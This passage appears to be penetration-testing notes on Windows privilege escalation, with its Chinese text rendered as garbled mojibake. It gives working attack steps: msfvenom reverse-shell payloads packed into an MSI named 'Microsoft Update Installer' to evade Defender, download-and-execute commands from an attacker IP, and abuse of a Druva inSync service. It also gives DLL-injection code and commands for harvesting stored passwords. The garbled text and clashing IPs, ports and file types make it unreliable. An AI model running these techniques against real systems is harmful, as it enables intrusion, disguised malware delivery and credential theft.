ÈÄôÊòØ‰∏ÄÁ®ÆÁ§æ‰∫§Â∑•Á®ãÊîªÊìäÊñπÂºèÔºåÈÄèÈÅéÁîüÊàê MSI ÂÆâË£ùÊ™îÊ°àÔºåÁï∂ÁõÆÊ®ôÂü∑Ë°åÂæåÊúÉËá™ÂãïÈÄ£ÂõûÊîªÊìäÁ´ØÔºåÁç≤Âèñ shell ÊéßÂà∂Ê¨ä„ÄÇ

***

## 2Ô∏è‚É£ ÁîüÊàêÊÉ°ÊÑè MSI Ê™îÊ°à

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.234 LPORT=1234 -f exe > aie.exe
```

| Êåá‰ª§ÂèÉÊï∏                           | Ë™™Êòé                          |
| ------------------------------ | --------------------------- |
| -p windows/shell\_reverse\_tcp | ÁîüÊàê Windows ÂèçÂêë shell Payload |
| LHOST=10.10.14.72              | Êú¨Âú∞ IPÔºåÂõûÈÄ£ÁõÆÊ®ô                  |
| LPORT=9443                     | ÊîªÊìäÁ´ØÁõ£ËÅΩÁöÑ port                 |
| -f exe                         | ÊåáÂÆöËº∏Âá∫Ê†ºÂºèÁÇ∫ exe ÂÆâË£ùÊ™î             |
| > aie.exe                      | Â∞áÁµêÊûúËº∏Âá∫ÁÇ∫ aie.msi Ê™îÊ°à           |

***

## 3Ô∏è‚É£ Ë®≠ÂÆö Metasploit Handler Áõ£ËÅΩ

ÊâìÈñã msfconsoleÔºö

```
msfconsole
```

ÈÖçÁΩÆ listenerÔºö

```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST 10.10.14.72
set LPORT 9443
set ExitOnSession false
exploit -j
```

| Êåá‰ª§                                      | ÂäüËÉΩË™™Êòé                         |
| --------------------------------------- | ---------------------------- |
| use exploit/multi/handler               | ‰ΩøÁî®ÈÄöÁî®ÂõûÈÄ£Áõ£ËÅΩÊ®°ÁµÑ                   |
| set payload windows/shell\_reverse\_tcp | Ë®≠ÂÆöËàáÁîüÊàê payload Áõ∏ÂêåÁöÑÂèçÂêë shell ÊñπÂºè |
| set LHOST 10.10.14.72                   | Ë®≠ÂÆöÂõûÈÄ£ IPÔºåÂøÖÈ†àÂíå payload ÂèÉÊï∏Áõ∏Âêå     |
| set LPORT 9443                          | Ë®≠ÂÆöÂõûÈÄ£ port                    |
| set ExitOnSession false                 | Âú®Êé•Âà∞ÂõûÈÄ£ session Âæå‰∏çË¶ÅËá™ÂãïÈÄÄÂá∫ÔºåÁπºÁ∫åÁõ£ËÅΩ   |
| exploit -j                              | Âú®ËÉåÊôØÂü∑Ë°å                        |

***

## 4Ô∏è‚É£ ÂÇ≥ÈÄÅ aie.msi Áµ¶ÁõÆÊ®ôÂèóÂÆ≥ËÄÖ

### ÊñπÊ≥ï 1Ô∏è‚É£ÔºöÊâãÂãïÊã∑Ë≤ù

* ÈÄèÈÅé U Áõ§„ÄÅÈÉµ‰ª∂ÊàñÂÖ±‰∫´Ë≥áÊñôÂ§æÊñπÂºèÂÇ≥ÈÄÅËá≥ÁõÆÊ®ô‰∏ªÊ©ü„ÄÇ

### ÊñπÊ≥ï 2Ô∏è‚É£ÔºöÂª∫Á´ã HTTP Server ‰æõ‰∏ãËºâ

Âú® Kali ‰∏äÔºö

```
python3 -m http.server 8080
```

Windows ÂèóÂÆ≥ËÄÖ‰∏ãËºâÂëΩ‰ª§Ôºö

```
powershell -c "Invoke-WebRequest -Uri http://10.10.14.72:8080/aie.msi -OutFile C:\Users\Public\aie.msi"
```

ÊàñÔºö

```
certutil -urlcache -split -f http://10.10.14.72:8080/aie.msi C:\Users\Public\aie.msi
```

ÁÑ∂ÂæåÂü∑Ë°åÔºö

```
C:\Users\Public\aie.msi
```

***

## 5Ô∏è‚É£ Êé•Êî∂Âà∞ÂõûÈÄ£Âæå

Metasploit È°ØÁ§∫Ôºö

```
[*] Sending stage (xxxx bytes) to <ÁõÆÊ®ôIP>
[*] Command shell session 1 opened (10.10.14.72:9443 -> <ÁõÆÊ®ôIP>:xxxx)
```

ÈÄ≤ÂÖ• sessionÔºö

```
sessions -i 1
```

ÈÄ≤Ë°åÂü∫Á§éÁ¢∫Ë™çÔºö

```
whoami
systeminfo
```

***

## 6Ô∏è‚É£ Ëã•Ë¢´ Windows Defender Êìã‰Ωè

ÊîπÁî®Âä†ÂØÜÊÆºËàá EXE ÂåÖË£ùÔºö

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.72 LPORT=9443 -f exe -e x86/shikata_ga_nai > aie.exe
```

ÁÑ∂ÂæåÁî® MSI Wrapper ÊâìÂåÖÊàê MSIÔºö

```
msi_wrapper.exe -o output.msi -e aie.exe -n "Microsoft Update Installer"
```

***

## ‚úÖ Â∞èÁ∏ΩÁµêÔºàÊäÑÂú®Á≠ÜË®òÊúÄÂ∫ïÈÉ®ÔºâÔºö

1. Áî® msfvenom Áî¢ÁîüÊÉ°ÊÑè MSI„ÄÇ
2. ÈñãÂïü msfconsole ÈÖçÁΩÆ handler ‰∏¶Áõ£ËÅΩ„ÄÇ
3. ÂÇ≥ÈÅû MSI Ê™îÊ°àÁµ¶ÂèóÂÆ≥ËÄÖ„ÄÇ
4. ÊàêÂäüÂü∑Ë°åÂæåÊé•Êî∂Âà∞ shellÔºåÈÄ≤Ë°åÊª≤ÈÄèÂæåÊìç‰Ωú„ÄÇ
5. Ëã•Ë¢´ÂÅµÊ∏¨Ôºå‰ΩøÁî®Âä†ÂØÜÊñπÂºè‰∏¶Áî® msi\_wrapper ÂåÖË£ù„ÄÇ

</details>

<details>

<summary>Vulnerable Services (ËÑÜÂº±ÊúçÂãô)</summary>

Âú®‰ºÅÊ•≠Áí∞Â¢É‰∏≠ÔºåÂç≥‰æøÁ≥ªÁµ±Êú¨Ë∫´Â∑≤Á∂ìÊâìÈÅéË£ú‰∏Å‰∏¶ÈÖçÁΩÆËâØÂ•ΩÔºå**ÂÖÅË®±‰ΩøÁî®ËÄÖËá™Ë°åÂÆâË£ùËªüÈ´î**Êàñ**Á¨¨‰∏âÊñπËªüÈ´î/ÊúçÂãôÁöÑËÑÜÂº±ÊÄß**Ôºå‰æùÁÑ∂ÊòØÊª≤ÈÄèÊ∏¨Ë©¶‰∏≠Ê•µ‰Ω≥ÁöÑÊèêÊ¨äÂàáÂÖ•Èªû„ÄÇ\
ÈÄôÈ°ûËÑÜÂº±ÊúçÂãôÈÄöÂ∏∏ÈÅãË°åÂú®**SYSTEM Ê¨äÈôê**Ôºå‰∏ÄÊó¶Â≠òÂú®Êú™ÊéàÊ¨äÂëΩ‰ª§Ê≥®ÂÖ•ÊàñÈåØË™§Ê¨äÈôêË®≠ÁΩÆÔºå\
ÊîªÊìäËÄÖ‰æøËÉΩÂú®‰ΩéÊ¨äÈôêÂ∏≥Êà∂‰∏ãÈÄèÈÅéÊú¨Âú∞Êàñ RPC ÊñπÂºèÔºåÁõ¥Êé•ÂçáÁ¥öÁÇ∫ SYSTEM„ÄÇ

> üö® ÂØ¶Èöõ‰ºÅÊ•≠Â∏∏Ë¶ãÈ´òÈ¢®Èö™Â†¥ÊôØÔºö

* ÊéàÊ¨ä‰ΩøÁî®ËÄÖÊúâÊú¨Âú∞ÂÆâË£ùÊ¨äÈôê
* ËÄÅËàäÁâàÊú¨ÂÇô‰ªΩËªüÈ´îÔºàÂ¶Ç Druva inSync„ÄÅVeeamÔºâ
* Monitoring AgentÔºàÂ¶Ç SolarWinds„ÄÅManageEngineÔºâ
* ÊúçÂãôÁ´ØÂè£Êú™ÈôêÂà∂ÔºàÂÖßÁ∂≤ÈñãÊîæ‰ªªÊÑèÂ≠òÂèñÔºâ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÊûöËàâÂ∑≤ÂÆâË£ùËªüÈ´î (wmic / Get-WmiObject)
      ‚Üì
2Ô∏è‚É£ Google / Exploit-DB Ê™¢Á¥¢ÁâàÊú¨ÊòØÂê¶Â≠òÂú®Â∑≤Áü•ÊºèÊ¥û
      ‚Üì
3Ô∏è‚É£ Á¢∫Ë™çÊúçÂãôÂü∑Ë°åÊ¨äÈôêÔºà‰∏ÄËà¨ÈÉΩ‰ª• SYSTEM ÈÅãË°åÔºâ
      ‚Üì
4Ô∏è‚É£ Á¢∫Ë™çÊú¨Âú∞ÊúçÂãôÁõ£ËÅΩÁ´ØÂè£ÔºànetstatÔºâ
      ‚Üì
5Ô∏è‚É£ Âà©Áî® Exploit PoC ÁôºÈÄÅÁâπË£ΩÂ∞ÅÂåÖÊàñÊú¨Âú∞‰∫§‰∫í
      ‚Üì
6Ô∏è‚É£ ÂèñÂæó SYSTEM Ê¨äÈôê shell ÊàñÂâµÂª∫Êú¨Âú∞ÁÆ°ÁêÜÂì°Â∏≥Êà∂
```

***

### üë®‚Äçüè´ ÊîªÊìäÁØÑ‰æãÔºàDruva inSync Âº±ÈªûÂà©Áî®Ôºâ

#### 1Ô∏è‚É£ ÊûöËàâÂ∑≤ÂÆâË£ùËªüÈ´î

```powershell
wmic product get name
```

ÁôºÁèæÔºö

```
Druva inSync 6.6.3
```

***

#### 2Ô∏è‚É£ Ê™¢Êü•ÊúçÂãôÁõ£ËÅΩÁ´ØÂè£

```powershell
netstat -ano | findstr 6064
```

È°ØÁ§∫Ôºö

```
TCP    127.0.0.1:6064         LISTENING
```

***

#### 3Ô∏è‚É£ Êü•Ë©¢Â∞çÊáâÈÄ≤Á®ã

```powershell
get-process -Id <PID>
```

ÁµêÊûúÔºö

```
ProcessName: inSyncCPHwnet64 (SYSTEM Ê¨äÈôê)
```

***

#### 4Ô∏è‚É£ ËÑÜÂº±ÊúçÂãô‰∫§‰∫íÔºàPoC Âà©Áî®Ôºâ

PoC PowerShell ÁØÑ‰æãÔºö

```powershell
$cmd = "net user pentest123 /add"
# ‰ª•‰∏ãÂª∫Á´ã TCP ‰∏¶Â∞áÊåá‰ª§ÂÇ≥ÈÅû
```

ÊàñÊîπÊàêÈÄèÈÅé powershell ËºâÂÖ•ÂèçÂêë shellÔºö

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<your_ip>:8080/shell.ps1')"
```

***

#### 5Ô∏è‚É£ ÂïüÂãï Python Server & Netcat Áõ£ËÅΩ

```bash
python3 -m http.server 8080
nc -lvnp 9443
```

***

#### 6Ô∏è‚É£ Âú®ÁõÆÊ®ôÁ´ØÂü∑Ë°å PoC

ÁµêÊûúËøîÂõûÔºö

```
PS C:\WINDOWS\system32> whoami
nt authority\system
```

***

### üõ† Â∑•ÂÖ∑Ê∏ÖÂñÆÊé®Ëñ¶

| Â∑•ÂÖ∑ÂêçÁ®±                 | ÂäüËÉΩ                          |
| -------------------- | --------------------------- |
| wmic / Get-WmiObject | ÊûöËàâÁ≥ªÁµ±Â∑≤ÂÆâË£ùÊáâÁî®Á®ãÂºè                 |
| netstat              | Êü•Ë©¢Êú¨Âú∞Áõ£ËÅΩÁ´ØÂè£                    |
| PowerShell           | PoC ÂØ´ÂÖ•ÂèäÁôºÈÄÅÁâπË£Ω RPC Ë´ãÊ±Ç          |
| nc / netcat          | Á≠âÂæÖÂèçÂêë shell ÂõûÈÄ£               |
| Python http.server   | Ëá®ÊôÇÊ™îÊ°àÂàÜ‰∫´ / Êèê‰æõ PowerShell ËÖ≥Êú¨‰∏ãËºâ |

***

### ‚úÖ Â∏∏Ë¶ãÈåØË™§Ëàá Debug

| ÂïèÈ°å                | Ëß£Ê±∫ÊñπÊ≥ï                                        |
| ----------------- | ------------------------------------------- |
| PowerShell ÁÑ°Ê≥ïÂü∑Ë°åËÖ≥Êú¨ | `Set-ExecutionPolicy Bypass -Scope Process` |
| Ê≤íÊúâÊî∂Âà∞ÂõûÈÄ£            | Ê™¢Êü•ÁõÆÊ®ôÊ©üÊòØÂê¶ÂèØ‰ª•Â≠òÂèñÊîªÊìä‰∏ªÊ©ü IPÔºàÂÖßÁ∂≤ÊàñÈò≤ÁÅ´ÁâÜÂïèÈ°åÔºâ                |
| ÂëΩ‰ª§Ê≥®ÂÖ•Â§±ÊïóÊàñÊ≤íÊúâÂõûÊáâ       | Á¢∫Ë™çÁâàÊú¨ÊòØÂê¶Ê≠£Á¢∫ÔºåÊàñÂòóË©¶ÊîπÁÇ∫Âª∫Á´ãÊú¨Âú∞ÁÆ°ÁêÜÂì°Â∏≥Êà∂ÂëΩ‰ª§ÂÖàÂÅöÊ∏¨Ë©¶               |

</details>

<details>

<summary>DLL Injection</summary>



üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ\
DLL InjectionÔºàDLL Ê≥®ÂÖ•ÔºâÊòØ‰∏ÄÁ®ÆÂ∞áÁâπÂÆöÊÉ°ÊÑèÊàñËá™Ë®Ç DLL Ê™îÊ°àÊèíÂÖ•ÁõÆÊ®ôÈÄ≤Á®ãÂÖßÈÉ®ÁöÑÊäÄË°ìÔºåËÆìË©≤ DLL Âú®ÁõÆÊ®ôÈÄ≤Á®ã‰∏ä‰∏ãÊñá‰∏≠Âü∑Ë°åÔºåÈÄ≤ËÄåÂΩ±ÈüøÂÖ∂Ë°åÁÇ∫ÊàñÁ´äÂèñÊïèÊÑüË≥áÊ∫ê„ÄÇÊ≠§ÊäÄË°ìÈô§‰∫ÜÂêàÊ≥ïÁî®ÈÄîÔºàÂ¶Ç Hot Patching Ëàá Azure ÁÑ°ÈáçÂïüÊõ¥Êñ∞ÔºâÔºå‰πüÊòØÈß≠ÂÆ¢Â∏∏Áî®‰æÜÁπûÈÅéÈò≤ÊØí„ÄÅÈò≤ÁÅ´ÁâÜÊàñÊèêÂçáÊ¨äÈôêÁöÑÈáçË¶ÅÊâãÊ≥ï„ÄÇËã•‰ºÅÊ•≠Á´ØÊáâÁî®Êú™ÂÅöÂ•ΩË∑ØÂæëÈò≤Ë≠∑„ÄÅÁôΩÂêçÂñÆËàáË®òÊÜ∂È´îÈò≤Ë≠∑ÔºåÊ•µÊòìÊàêÁÇ∫ÊîªÊìäÁõÆÊ®ô„ÄÇ

üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàË∂ÖË©≥Á¥∞ÁâàÔºâ

```
1Ô∏è‚É£ ÂÅµÊ∏¨ÁõÆÊ®ôÈÄ≤Á®ãÔºàÈÄèÈÅé Process Explorer / tasklist ÊâæÂà∞ÈßêÁïôÊáâÁî®Á®ãÂºèÔºâ
‚Üì
2Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ô PID (Process ID)
‚Üì
3Ô∏è‚É£ Ë£Ω‰ΩúÊÉ°ÊÑè DLLÔºàÂèØÂê´ Meterpreter„ÄÅÂèçÂêëÈÄ£Á∑ö„ÄÅÈçµÁõ§ÂÅ¥ÈåÑ„ÄÅRAT Á≠âÂäüËÉΩÔºâ
‚Üì
4Ô∏è‚É£ ÈñãÂïüÁõÆÊ®ôÈÄ≤Á®ãÊ¨äÈôêÂè•ÊüÑÔºàOpenProcessÔºåÁ¢∫‰øùÊúâÂØ´ÂÖ•Ë®òÊÜ∂È´î„ÄÅÂâµÂª∫Âü∑Ë°åÁ∑íÊ¨äÈôêÔºâ
‚Üì
5Ô∏è‚É£ ÈÅ†Á´ØÂàÜÈÖçË®òÊÜ∂È´îÁ©∫ÈñìÔºàVirtualAllocExÔºâ
‚Üì
6Ô∏è‚É£ ÂØ´ÂÖ• DLL Ë∑ØÂæëÂà∞ÁõÆÊ®ôÈÄ≤Á®ãË®òÊÜ∂È´î (WriteProcessMemory)
‚Üì
7Ô∏è‚É£ ÂèñÂæó kernel32.dll ÁöÑ LoadLibraryA ‰ΩçÂùÄ (GetProcAddress)
‚Üì
8Ô∏è‚É£ ÈÄèÈÅé CreateRemoteThread ÂëºÂè´ LoadLibraryA Âü∑Ë°å DLL ËºâÂÖ•
‚Üì
9Ô∏è‚É£ DLL Âú®ÁõÆÊ®ôÈÄ≤Á®ã‰∏≠ÊàêÂäüÂü∑Ë°åÔºåÊéßÂà∂Ê¨ä‰∫§Âà∞ÊîªÊìäËÄÖÊâã‰∏≠
```

üë®‚Äçüè´ ÊîªÊìäÊåá‰ª§ÁØÑ‰æãÔºàÂ∞àÊ•≠ËàáÁ¥∞ÁØÄÁâàÔºâ\
1Ô∏è‚É£ **Êü•ÊâæÁõÆÊ®ô PID**Ôºö

```powershell
tasklist | findstr <ÁõÆÊ®ôÂêçÁ®±>
```

2Ô∏è‚É£ **Áî¢Áîü DLL ËºâËç∑**Ôºà‰ª• msfvenom Áà≤‰æãÔºâÔºö

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Êú¨Ê©üIP> LPORT=4444 -f dll -o evil.dll
```

3Ô∏è‚É£ **C ÁØÑ‰æãÁ®ãÂºèÁ¢ºÔºàÂü∫Êú¨ DLL Ê≥®ÂÖ•ÔºâÔºö**

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, addr, dll_path, strlen(dll_path), NULL);
LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadlib, addr, 0, NULL);
```

4Ô∏è‚É£ **Metasploit ÂèçÂ∞ÑÂûãÊ≥®ÂÖ•Ê®°ÁµÑÔºàÈÅ©Áî®È´òÈöéÁõÆÊ®ôÔºâÔºö**

```bash
use exploit/windows/local/reflective_dll_injection
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Êú¨Ê©üIP>
set LPORT 4444
exploit
```

5Ô∏è‚É£ **ÂÅµÊ∏¨ DLL Âä´ÊåÅÈªûÔºà‰ΩøÁî® ProcMonÔºâÔºö**

* ÁØ©ÈÅ∏ Operation ÁÇ∫ `CreateFile` ‰∏îÁµêÊûúÁÇ∫ `NAME NOT FOUND`„ÄÇ
* ÊâæÂá∫ÊáâÁî®Á®ãÂºèÂòóË©¶ËÆÄÂèñ‰ΩÜÊâæ‰∏çÂà∞ÁöÑ DLL ÂêçÁ®±„ÄÇ
* Ëá™Ë£Ω DLL ÊîæÁΩÆÊñºÁõ∏ÂêåË∑ØÂæëÔºåÂç≥ÂèØÂä´ÊåÅ„ÄÇ

üõ† Â∑•ÂÖ∑ËàáÂª∫Ë≠∞

| Â∑•ÂÖ∑               | Áî®ÈÄî                                     |
| ---------------- | -------------------------------------- |
| Process Explorer | Ê™¢Êü•ÁõÆÊ®ôÈÄ≤Á®ãËàáÂ∑≤ËºâÂÖ•Ê®°ÁµÑÊ∏ÖÂñÆ                         |
| ProcMon          | Âç≥ÊôÇÁõ£ÊéßÊ™îÊ°àËºâÂÖ•Ëàá DLL ÊêúÂ∞ãÂ§±ÊïóÁ¥ÄÈåÑ                   |
| PE Explorer      | ÂàÜÊûê DLL PE Ê™îÈ†≠ËàáÂáΩÂºèÂåØÂÖ•Ë°®                     |
| CFF Explorer     | ‰øÆÊîπ DLL MetadataÔºåË£Ω‰Ωú Proxy DLL ‰ΩøÁî®        |
| Metasploit       | ÂÖßÂª∫Â§öÁ®Æ DLL Ê≥®ÂÖ•Ëàá Exploit Ê®°ÁµÑÊîØÊè¥              |
| PowerShell       | ÂèØÂø´ÈÄüÈÄ≤Ë°åÊ∏¨Ë©¶ÊÄß PoC DLL Ê≥®ÂÖ•Êàñ PowerShell ‰∏ãËºâÂü∑Ë°åÊîªÊìä |
| msfvenom         | Âª∫Á´ãÂêÑÂºè Windows ÂèçÂêëÈÄ£Á∑ö„ÄÅMeterpreter DLL ËºâËç∑   |

‚úÖ Â∞èÁµê & ‰∏ã‰∏ÄÊ≠•Âª∫Ë≠∞

* Â¶ÇÊûúÁõÆÊ®ôÁ≥ªÁµ±ÂÖ∑ÂÇô EDR / AV Èò≤Ë≠∑ÔºåÂÑ™ÂÖàËÄÉÊÖÆ‰ΩøÁî® Manual Mapping Êàñ Reflective InjectionÔºåÈÅøÂÖç LoadLibrary ÂëºÂè´Ë¢´ÂÅµÊ∏¨„ÄÇ
* È´òÈöéÊª≤ÈÄèÈöéÊÆµÊôÇÔºåÁõ°ÈáèÂà©Áî® DLL Âä´ÊåÅÊñπÂºèÊª≤ÈÄèÂà∞‰ºÅÊ•≠ IT ÁÆ°ÁêÜÂ∑•ÂÖ∑ÊàñÂ∏∏ÈßêÊúçÂãô„ÄÇ
* Ê≥®ÂÖ•ÊàêÂäüÂæåÂèØÈÄ≤‰∏ÄÊ≠•Ë®≠ÂÆöÔºöË®àÂäÉ‰ªªÂãô„ÄÅWMI Áõ£ËÅΩ„ÄÅË®ªÂÜäË°®ÊåÅ‰πÖÂåñÊàñ‰ΩøÁî® msf post Ê®°ÁµÑÂü∑Ë°å lateral movement„ÄÇ



</details>

<details>

<summary>Credential HuntingÔºàÊÜëË≠âÁã©ÁçµÔºâ</summary>



### ‰∏Ä„ÄÅÊîªÊìäÁõÆÊ®ôÊ¶ÇÂøµÔºö

ÊÜëË≠âÁã©ÁçµÊòØÂú®Á≥ªÁµ±‰∏≠ÔºàÊú¨Âú∞ÊàñÂüüÁí∞Â¢ÉÔºâÂ∞ãÊâæÁ°¨Á∑®Á¢º„ÄÅÊö´Â≠ò„ÄÅÊàñÊú™Â¶•ÂñÑ‰øùË≠∑ÁöÑÂØÜÁ¢º„ÄÅÂ∏≥ËôüÊÜëË≠â„ÄÇ\
ÈÄèÈÅéÈÄô‰∫õÊÜëË≠âÔºåÊàëÂÄëÂèØ‰ª•Ôºö

* ÊèêÂçáÊú¨Âú∞Ê¨äÈôêÔºàLocal Privilege EscalationÔºâ
* Áç≤ÂèñÊ©´ÂêëÁßªÂãïÂÖ•Âè£ÔºàLateral MovementÔºâ
* ÂüüÂÖßÊ¨äÈôêÊèêÂçáÔºàDomain Privilege EscalationÔºâ
* ÊåÅ‰πÖÂåñÊ§çÂÖ•ÊàñÂæåÈñÄÈÉ®ÁΩ≤

***

### ‰∫å„ÄÅÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºàÊñáÂ≠óÁâàÔºâÔºö

```
ÊÜëË≠âÁã©ÁçµÔºàCredential HuntingÔºâ
‚îú‚îÄ ÊáâÁî®ÈÖçÁΩÆÊ™îÊ°àÔºàApp Config FilesÔºâ
‚îÇ   ‚îú‚îÄ ÊêúÂ∞ãÊïèÊÑüÂ≠ó (findstr / grep)
‚îÇ   ‚îî‚îÄ ËßÄÂØü web.config„ÄÅdatabase.config„ÄÅappsettings.json
‚îú‚îÄ PowerShell Ê≠∑Âè≤Ë®òÈåÑÊ™î
‚îÇ   ‚îú‚îÄ ËÆÄÂèñ ConsoleHost_history.txt
‚îÇ   ‚îî‚îÄ Ê©´ÂêëÊäìÂèñÊâÄÊúâ‰ΩøÁî®ËÄÖÊ≠∑Âè≤Á¥ÄÈåÑ
‚îú‚îÄ ÁÄèË¶ΩÂô®Â≠óÂÖ∏Ê™îÔºàÂ¶Ç Chrome Custom DictionaryÔºâ
‚îú‚îÄ Unattend.xml„ÄÅËá™ÂãïÂåñÂÆâË£ùÊñá‰ª∂
‚îÇ   ‚îú‚îÄ ÊêúÁ¥¢Â∏∏Ë¶ãË∑ØÂæëÔºàC:\Windows\Panther„ÄÅC:\Windows\System32\SysprepÔºâ
‚îÇ   ‚îî‚îÄ Base64 Ëß£Á¢ºÊàñÊòéÊñáÂØÜÁ¢ºËÆÄÂèñ
‚îú‚îÄ PowerShell Clixml ÊÜëË≠âÊñá‰ª∂Ëß£ÂØÜ
‚îî‚îÄ ÁôªÈåÑÊ™î & Ë®≠ÂÆöÊ™îÊïèÊÑü‰ø°ÊÅØ
```

***

### ‰∏â„ÄÅÂÖ∑È´îÊìç‰ΩúÁØÑ‰æãËàáËÉåÂæåÂéüÁêÜÔºö

***

#### 1Ô∏è‚É£ Â∞ãÊâæÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÂØÜÁ¢º

* **ÁÇ∫‰ªÄÈ∫º**Ôºö\
  ÂæàÂ§öÊáâÁî®ÁÇ∫Êñπ‰æøÁÆ°ÁêÜÔºåÂú® .config„ÄÅ.ini„ÄÅ.xml„ÄÅÊàñ .json Êñá‰ª∂‰∏≠Á°¨Á∑®Á¢ºÂØÜÁ¢º„ÄÇ
* **ÂëΩ‰ª§ÁØÑ‰æãÔºàWindowsÔºâ**Ôºö

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

* **ÁØÑ‰æãÁµêÊûú**Ôºö

```
C:\inetpub\wwwroot\web.config: <add key="dbPassword" value="P@ssw0rd123!" />
```

* **Â¶ÇÊûúÊ≤íÊúâÁµêÊûú**Ôºö ÊîπÁî®ÈÅûËø¥ÊêúÂ∞ãÔºö

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

* **Debug**Ôºö\
  Â¶ÇÊûúÂ†±Ê¨äÈôê‰∏çË∂≥ÔºåÂÖàÊèêÂçáËá≥ SYSTEM Ê¨äÈôêÊàñÁî® SeBackupPrivilege ËÆÄÊ™îÊ°à„ÄÇ

***

#### 2Ô∏è‚É£ ÁÄèË¶ΩÂô®Â≠óÂÖ∏Êñá‰ª∂

* **ÁÇ∫‰ªÄÈ∫º**Ôºö\
  Êúâ‰∫õ‰ΩøÁî®ËÄÖÊúÉÂ∞áÂØÜÁ¢ºË™§Âä†ÂÖ• Chrome Â≠óÂÖ∏Ê™î„ÄÇ
* **ÁØÑ‰æãË∑ØÂæë**Ôºö

```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'
```

* **ÁµêÊûúÁØÑ‰æã**Ôºö

```
Password1234!
```

* **Debug**Ôºö\
  Áî® admin Ê¨äÈôêÂ≠òÂèñÂ§öÂÄã‰ΩøÁî®ËÄÖË∑ØÂæë„ÄÇ

***

#### 3Ô∏è‚É£ Unattend.xml Êñá‰ª∂

* **ÁÇ∫‰ªÄÈ∫º**Ôºö\
  Windows ÂÆâË£ùËÖ≥Êú¨Â∏∏Â≠òÊîæÊòéÊñá AutoLogon ÊÜëË≠â„ÄÇ
* **ÊêúÂ∞ãÁØÑ‰æã**Ôºö

```powershell
Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,unattend.xml.bak -ErrorAction SilentlyContinue
```

* **ÁµêÊûúÁØÑ‰æã**Ôºö

```xml
<Value>local_4dmin_p@ss</Value>
```

* **Debug**Ôºö Â¶ÇÊûúÈÅ≠ÈÅá„ÄåÂ≠òÂèñË¢´Êãí„ÄçÔºå‰ΩøÁî® SYSTEM Ê¨äÈôêÈáçÊñ∞ÊêúÁ¥¢„ÄÇ

***

#### 4Ô∏è‚É£ PowerShell Ê≠∑Âè≤Ê™î

* **ÁÇ∫‰ªÄÈ∫º**Ôºö\
  Á≥ªÁµ±ÁÆ°ÁêÜÂì°Â∏∏‰∏çÂ∞èÂøÉÂú® PowerShell Âü∑Ë°åÈÅéÂê´ÂØÜÁ¢ºÁöÑÊåá‰ª§„ÄÇ
* **ÂëΩ‰ª§ÁØÑ‰æã**Ôºö

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

* **Ê©´ÂêëÁçµÂèñÂ§öÁî®Êà∂**Ôºö

```powershell
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

* **ÁµêÊûúÁØÑ‰æã**Ôºö

```
wevtutil qe Application /u:WEB02\administrator /p:5erv3rAdmin!
```

* **Debug**Ôºö\
  Ê≤íÊúâÊâæÂà∞ÁµêÊûúÊôÇÔºåÂèñÂæóÊú¨Ê©üÁÆ°ÁêÜÂì°Ê¨äÈôêÔºåÂÜçÂòóË©¶Â≠òÂèñÂÖ∂‰ªñÂ∏≥ËôüÁõÆÈåÑ„ÄÇ

***

#### 5Ô∏è‚É£ PowerShell Clixml ÊÜëË≠âËß£ÂØÜ

* **ÁÇ∫‰ªÄÈ∫º**Ôºö\
  Á≥ªÁµ±ÁÆ°ÁêÜÂì°ÊúÉÂ∞áÂØÜÁ¢ºÁî® `Export-Clixml` ÂÑ≤Â≠òÔºå‰ΩÜÂè™ÊúâÂêåÁî®Êà∂ÂêåÊ©üÂô®ÂèØËß£ÂØÜ„ÄÇ
* **ÁØÑ‰æãÁ®ãÂºè**Ôºö

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

* **ÁµêÊûúÁØÑ‰æã**Ôºö

```
bob / Str0ng3ncryptedP@ss!
```

* **Debug**Ôºö\
  Â¶ÇÁÑ°Ê≥ïËß£ÂØÜÔºåÁ¢∫Ë™çÁõÆÂâçÊòØÂê¶Âêå‰∏ÄÂÄã‰ΩøÁî®ËÄÖ‰∏ä‰∏ãÊñáÔºåÊàñÊâæÂÖ∂‰ªñÂ∏≥Ëôü session Ê≥®ÂÖ•ÂèñÂæóÂêå‰∏ä‰∏ãÊñáÂü∑Ë°å„ÄÇ

</details>

<details>

<summary>ÈÄ≤ÈöéÊú¨Âú∞ËàáÁ∂≤Ë∑ØÂÖ±Áî®Á£ÅÁ¢üÊÜëË≠âÁã©Áçµ</summary>

1Ô∏è‚É£ ‰ºÅÊ•≠‰∏≠Â∏∏Ë¶ãÊÉÖÊ≥ÅÔºö

